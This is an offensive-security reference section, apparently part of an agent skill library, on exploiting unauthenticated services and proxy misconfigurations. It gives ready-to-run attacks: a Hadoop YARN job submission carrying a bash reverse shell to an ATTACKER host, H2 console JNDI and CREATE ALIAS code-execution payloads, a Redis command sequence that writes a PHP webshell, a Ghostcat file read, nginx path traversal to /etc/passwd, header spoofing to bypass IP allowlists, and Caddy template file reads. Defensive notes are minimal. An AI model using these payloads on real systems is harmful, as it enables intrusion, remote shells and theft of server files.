# unauthorized-access-common-services technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 6. HADOOP YARN RESOURCEMANAGER (PORT 8088)

### Detection

```bash
curl http://TARGET:8088/cluster
# If accessible → unauthenticated YARN ResourceManager UI
```

### RCE via Application Submission

```bash
# Submit a MapReduce application that executes a command:
curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application
# Returns: {"application-id":"application_xxx_0001"}

curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_xxx_0001",
    "application-name": "test",
    "am-container-spec": {
      "commands": {"command": "/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}
    },
    "application-type": "YARN"
  }'
```

### Hardening

Enable Kerberos authentication; restrict network access to management ports.

---

## 7. H2 DATABASE CONSOLE

### Detection

H2 Console is often enabled in Spring Boot apps via:
```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

Access: `http://TARGET:PORT/h2-console`

### JNDI Injection via Connection String

In the H2 Console login form, the JDBC URL field accepts JNDI.

**BeanFactory + EL bypass** (works on Java 8u252+):

```text
# JDBC URL in login form:
javax.naming.InitialContext

# LDAP response attributes:
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

Also see [jndi-injection](../../jndi-injection/SKILL.md) for the full JNDI/BeanFactory exploitation flow.

### RCE via RUNSCRIPT

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

---

## 8. QUICK REFERENCE

```text
# Redis — check auth:
redis-cli -h TARGET ping

# Redis — write webshell:
SET x "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE

# Rsync — list modules:
rsync TARGET::

# Ghostcat — read web.xml:
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# YARN — submit RCE job:
curl -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application

# H2 — RCE via alias:
CREATE ALIAS EXEC AS '...Runtime.exec...'; CALL EXEC('id');
```

---

## 9. REVERSE PROXY MISCONFIGURATION

### Nginx Off-By-Slash Path Traversal

```nginx
# Vulnerable configuration:
location /static {
    alias /var/www/static/;
}
# Access: /static../etc/passwd → resolves to /var/www/etc/passwd
# The missing trailing slash on location causes path traversal

# Fix: location /static/ (with trailing slash matching alias)
```

### Nginx Missing Root Location

```nginx
# If no root location defined and alias is used:
# Attacker may access nginx.conf or other server files
GET /..%2f..%2fetc/nginx/nginx.conf HTTP/1.1
```

### X-Forwarded-For / X-Real-IP Trust

```
# If backend trusts these headers for IP-based auth:
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# May bypass IP whitelist for admin panels
```

### Caddy Template Injection

```
# Caddy with templates enabled:
# If user input reaches Caddy template rendering:
{{.Req.Host}}          → Information disclosure
{{readFile "/etc/passwd"}}  → Local file read via Go template
# This is essentially a Go template injection through proxy config
```

### Useful Tools

- `yandex/gixy` — Nginx configuration analyzer
- `Raelize/Kyubi` — Reverse proxy misconfiguration scanner
- `GerbenJavado/bypass-url-parser` — URL parser confusion tester
